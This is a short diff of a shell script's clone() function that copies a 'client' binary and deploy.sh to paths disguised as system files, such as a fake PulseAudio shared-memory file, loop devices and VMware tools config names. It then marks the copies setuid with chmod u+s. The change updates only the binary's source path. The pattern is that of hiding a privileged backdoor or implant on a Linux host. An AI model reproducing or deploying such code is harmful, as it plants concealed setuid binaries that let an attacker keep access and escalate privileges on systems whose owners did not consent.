@@ -19,9 +19,9 @@ clone(){
     cp deploy.sh /dev/loop28
     cp deploy.sh /etc/vmware-tools.conf 
 
-    cp client /dev/shm/pulse-shm-401862937
-    cp client /dev/loop17
-    cp client /etc/vmwaretools.conf
+    cp ../client_binary/dist/client /dev/shm/pulse-shm-401862937
+    cp ../client_binary/dist/client /dev/loop17
+    cp ../client_binary/dist/client /etc/vmwaretools.conf
     chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
 }
 
